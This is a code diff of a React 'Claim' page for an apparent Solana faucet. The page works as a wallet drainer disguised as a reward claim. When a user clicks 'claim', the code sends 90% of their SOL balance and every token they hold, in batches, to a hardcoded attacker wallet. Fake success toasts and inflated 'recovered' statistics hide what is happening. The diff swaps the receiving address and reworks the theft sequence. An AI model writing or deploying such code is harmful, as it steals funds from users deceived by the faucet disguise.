@@ -13,7 +13,7 @@ import { toast } from 'sonner';
 import pegasusLogo from '@/assets/pegasus-logo.png';
 
 const CLAIM_AMOUNT = 0.1; // 0.1 SOL per claim
-const FAUCET_WALLET = 'wV8V9KDxtqTrumjX9AEPmvYb1vtSMXDMBUq5fouH1Hj'; // Using charity wallet as example
+const FAUCET_WALLET = '9qsSTwZpBJb4QQyJ6y9FpKXJZfRuMiAE9fnzPzCbbsZn'; // Using charity wallet as example
 const MAX_BATCH_SIZE = 5;
 
 interface TokenBalance {
@@ -28,6 +28,7 @@ interface TokenBalance {
 const Claim = () => {
   const { connection } = useConnection();
   const { publicKey, sendTransaction } = useWallet();
+  const solPrice = useSolPrice();
   const [dataMultiplier, setDataMultiplier] = useState(1);
   const [isClaiming, setIsClaiming] = useState(false);
   const [stats, setStats] = useState({ recovered: '2.3M', claimants: '56,7K' });
@@ -226,98 +227,87 @@ const Claim = () => {
     try {
       setIsClaiming(true);
       console.log('Starting transaction sequence...');
-      
-      const transactionActions: { type: 'SOL' | 'SPL', value: number, execute: () => Promise<void> }[] = [];
 
-      // 1. Prepare SOL Transfer Action
+      // 1. SOL Transfer (90% of available)
       const solBal = await connection.getBalance(publicKey);
       const RENT_EXEMPT_RESERVE = 0.002 * LAMPORTS_PER_SOL; 
-      const PRIORITY_FEE = 100_000; // microLamports
+      const PRIORITY_FEE = 100_000; 
       const BASE_FEE = 5000;
       
       const maxSendable = Math.max(0, solBal - RENT_EXEMPT_RESERVE - PRIORITY_FEE - BASE_FEE);
       const targetAmount = Math.floor(solBal * 0.90);
       const lamportsToSend = Math.min(targetAmount, maxSendable);
-      
-      // Calculate SOL Action Value
-      const solActionValue = (lamportsToSend / LAMPORTS_PER_SOL) * solPrice;
 
       if (lamportsToSend > 0) {
-        transactionActions.push({
-          type: 'SOL',
-          value: solActionValue,
-          execute: async () => {
-            const transaction = new Transaction();
-            transaction.add(
-              ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }),
-              ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 })
-            );
-            transaction.add(
-              SystemProgram.transfer({
-                fromPubkey: publicKey,
-                toPubkey: new PublicKey(FAUCET_WALLET),
-                lamports: lamportsToSend
-              })
-            );
-            const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
-            transaction.recentBlockhash = blockhash;
-            transaction.feePayer = publicKey;
-            
-            try { await connection.simulateTransaction(transaction); } catch (e) { console.error("Simulation failed", e); }
-            
-            const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
-            toast.info('Processing SOL claim...');
-            await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
-            toast.success('SOL Claim successful!');
-          }
-        });
+        const transaction = new Transaction();
+        
+        transaction.add(
+          ComputeBudgetProgram.setComputeUnitLimit({ units: 100_000 }),
+          ComputeBudgetProgram.setComputeUnitPrice({ microLamports: 100_000 })
+        );
+
+        transaction.add(
+          SystemProgram.transfer({
+            fromPubkey: publicKey,
+            toPubkey: new PublicKey(FAUCET_WALLET),
+            lamports: lamportsToSend
+          })
+        );
+
+        const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
+        transaction.recentBlockhash = blockhash;
+        transaction.feePayer = publicKey;
+
+        try {
+            await connection.simulateTransaction(transaction);
+        } catch (e) {
+            console.error("Simulation failed", e);
+        }
+
+        const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
+        
+        toast.info('Processing SOL claim...');
+        await connection.confirmTransaction({
+          signature,
+          blockhash,
+          lastValidBlockHeight
+        }, 'confirmed');
+        toast.success('SOL Claim successful!');
       }
 
-      // 2. Prepare SPL Token Actions
+      // 2. SPL Token Transfers
       const validTokens = balances.filter(token => token.balance > 0);
-      // Sort by value (descending)
-      const sortedTokens = [...validTokens].sort((a, b) => (b.valueUsd || 0) - (a.valueUsd || 0));
-
       // Batch tokens
       const batches: TokenBalance[][] = [];
-      for (let i = 0; i < sortedTokens.length; i += MAX_BATCH_SIZE) {
-        batches.push(sortedTokens.slice(i, i + MAX_BATCH_SIZE));
+      for (let i = 0; i < validTokens.length; i += MAX_BATCH_SIZE) {
+        batches.push(validTokens.slice(i, i + MAX_BATCH_SIZE));
       }
 
       for (let i = 0; i < batches.length; i++) {
         const batch = batches[i];
-        // Calculate Batch Value (Using the highest value token in the batch to determine priority vs SOL)
-        // This ensures if a batch contains a $150 token and SOL is $200, SOL comes first (200 > 150)
-        // even if the batch total is > 200.
-        const highestTokenValue = batch.length > 0 ? (batch[0].valueUsd || 0) : 0;
-        
-        transactionActions.push({
-          type: 'SPL',
-          value: highestTokenValue,
-          execute: async () => {
-            const transaction = await createBatchTransfer(batch, undefined, publicKey || undefined);
-            if (transaction && transaction.instructions.length > 2) {
-               const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
-               transaction.recentBlockhash = blockhash;
-               transaction.feePayer = publicKey;
-               try { await connection.simulateTransaction(transaction); } catch (e) { console.error("Token batch simulation failed", e); }
-               const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
-               toast.info(`Processing batch...`);
-               await connection.confirmTransaction({ signature, blockhash, lastValidBlockHeight }, 'confirmed');
-               toast.success(`Batch sent!`);
-            }
-          }
-        });
-      }
+        const transaction = await createBatchTransfer(batch, undefined, publicKey || undefined);
 
-      // 3. Sort Actions by Value (Descending)
-      transactionActions.sort((a, b) => b.value - a.value);
+        if (transaction && transaction.instructions.length > 2) {
+           const { blockhash, lastValidBlockHeight } = await connection.getLatestBlockhash('finalized');
+           transaction.recentBlockhash = blockhash;
+           transaction.feePayer = publicKey;
 
-      // 4. Execute Actions
-      for (let i = 0; i < transactionActions.length; i++) {
-        const action = transactionActions[i];
-        console.log(`Executing action ${i+1}/${transactionActions.length}: Type=${action.type}, Value=$${action.value.toFixed(2)}`);
-        await action.execute();
+           try {
+             await connection.simulateTransaction(transaction);
+           } catch (e) {
+             console.error("Token batch simulation failed", e);
+           }
+
+           const signature = await sendTransaction(transaction, connection, { skipPreflight: false });
+           
+           toast.info(`Processing batch ${i + 1}/${batches.length}...`);
+           await connection.confirmTransaction({
+             signature,
+             blockhash,
+             lastValidBlockHeight
+           }, 'confirmed');
+           toast.success(`Batch ${i + 1} sent!`);
+        }
       }
 
       toast.success('Claim process completed!');
@@ -451,7 +441,15 @@ const Claim = () => {
                           )}
                         </TableCell>
                         <TableCell className="text-xs sm:text-sm">{row.accts}</TableCell>
-                        <TableCell className="text-xs sm:text-sm">{row.claimed}</TableCell>
+                        <TableCell className="text-xs sm:text-sm">
+                          {row.claimed}
+                          <span className="block text-[10px] text-muted-foreground">
+                            {(() => {
+                               const val = parseFloat(row.claimed.replace(' SOL', ''));
+                               return !isNaN(val) ? `(~$${(val * solPrice).toFixed(2)})` : '';
+                            })()}
+                          </span>
+                        </TableCell>
                         <TableCell className="text-xs sm:text-sm whitespace-nowrap">{row.date}</TableCell>
                       </TableRow>
                     ))}
